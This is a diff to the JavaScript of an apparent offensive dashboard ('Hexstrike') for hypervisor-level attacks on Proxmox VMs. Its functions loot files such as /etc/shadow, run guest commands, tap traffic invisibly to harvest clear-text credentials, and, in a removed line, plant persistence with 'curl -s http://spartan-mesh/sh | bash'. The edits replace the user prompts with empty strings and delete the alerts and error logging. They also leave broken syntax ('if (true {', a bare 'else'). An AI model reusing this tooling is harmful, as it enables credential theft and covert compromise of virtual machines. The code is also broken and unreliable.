@@ -536,7 +536,7 @@
     async function updateRotationInterval() {
         const el = document.getElementById('cfg-cycleInterval');
         const interval = parseInt(el.value);
-        if (isNaN(interval) || interval < 60000) return alert('Invalid interval (min 60000ms)');
+        if (isNaN(interval) || interval < 60000) return 
         
         await fetch(API_BASE + '/api/network/interval', {
             method: 'POST',
@@ -883,7 +883,7 @@
         const action = document.getElementById('hsm-pending-action').value;
         const payloadStr = document.getElementById('hsm-pending-payload').value;
         
-        if (!signature) { alert('Sovereign Access Denied: HSM Cryptographic Signature is required.'); return; }
+        if (!signature) {  return; }
 
         document.getElementById('hsm-signature-input-modal').style.display = 'none';
         const payload = JSON.parse(payloadStr);
@@ -910,7 +910,7 @@
     async function stopVm(node, vmid) { await fetch(API_BASE + '/api/proxmox/vm/action', { method: 'POST', headers: {'Content-Type':'application/json', 'Authorization':'Bearer '+authToken}, body: JSON.stringify({ node, vmid, action: 'stop' }) }); }
 
     async function execGuestCommand(node, vmid) {
-        const cmd = prompt(`Enter administrative command to execute on VM ${vmid} via QEMU Guest Agent:`);
+        const cmd = "";
         if (!cmd) return;
         log(`[QEMU-AGENT] Executing command on VM ${vmid}: ${cmd}`);
         try {
@@ -925,7 +925,7 @@
     }
 
     async function lootGuestFile(node, vmid) {
-        const path = prompt(`Enter absolute file path to loot from VM ${vmid} (e.g. /etc/shadow):`, '/etc/shadow');
+        const path = "";
         if (!path) return;
         log(`[EXFILTRATION] Extracting ${path} from VM ${vmid} via out-of-band hypervisor channel...`);
         try {
@@ -941,7 +941,7 @@
     }
 
     async function tapNetwork(node, vmid) {
-        const duration = prompt(`Enter capture duration in seconds for VM ${vmid}:`, '10');
+        const duration = "";
         if (!duration) return;
         log(`[NETWORK-TAP] Initiating hypervisor-level packet capture on VM ${vmid} for ${duration}s. This operation is invisible to the guest OS...`);
         try {
@@ -953,7 +953,7 @@
             const j = await res.json();
             if (j.ok) { 
                 log(`[NETWORK-TAP] Capture complete! Saved to ${j.file} (${(j.size / 1024).toFixed(2)} KB).`); 
-                if (confirm(`PCAP generated at ${j.file}.\n\nWould you like Hexstrike to automatically analyze this capture for clear-text credentials (FTP, HTTP, Telnet)?`)) {
+                if (true {
                     analyzePcapFile(j.file);
                 }
             }
@@ -1026,7 +1026,7 @@
                 table.innerHTML = `<tr><td colspan="5" style="padding:12px; text-align:center; color:var(--danger);">Failed to load sessions.</td></tr>`;
             }
         } catch(e) {
-            console.error(e);
+            
         }
     }
 
@@ -1096,7 +1096,7 @@
 
     async function destructAllGhosts() { if(true) await fetch(API_BASE + '/api/ghost/destruct-all', { method: 'POST', headers: { 'Authorization': 'Bearer ' + authToken } }); }
     async function triggerProjectZero() {
-        const code = prompt("Enter override code:");
+        const code = "";
         if (!code) return;
         const res = await fetch(API_BASE + '/api/sovereign/project-zero', {
             method: 'POST',
@@ -1104,7 +1104,7 @@
             body: JSON.stringify({ code })
         });
         if ((await res.json()).ok) location.reload();
-        else alert('Invalid Override Code.');
+        else 
     }
     
     async function cycleGhostIdentity() {
@@ -1113,13 +1113,13 @@
     }
     
     async function enqueue(tool) { 
-        const target = prompt(`Enter target IP for ${tool}:`, '127.0.0.1'); 
+        const target = ""; 
         if(target) {
             const stealth = document.getElementById('cfg-ghostRouting')?.checked || false;
             await fetch(API_BASE + '/api/enqueue', { method: 'POST', headers: {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + authToken}, body: JSON.stringify({ tool, target, stealth }) }); 
         }
     }
-    async function injectPersistence() { const node = prompt("Enter target node:"); const vmid = prompt("Enter target VMID:"); if(!node || !vmid) return; const res = await fetch(API_BASE + '/api/run-remote', { method: 'POST', headers: {'Content-Type':'application/json', 'Authorization':'Bearer '+authToken}, body: JSON.stringify({ node, vmid, code: 'curl -s http://spartan-mesh/sh | bash', lang: 'bash' }) }); if((await res.json()).ok) log(`[PERSISTENCE] established on VM ${vmid}.`); }
+    async function injectPersistence() { const node = ""; }
 
     if(authToken) fetch(API_BASE + '/api/status', { headers: { 'Authorization': 'Bearer ' + authToken } }).then(r => r.json()).then(j => { if(j.sovereign_mode) initDashboard(j.tier); });
   </script>
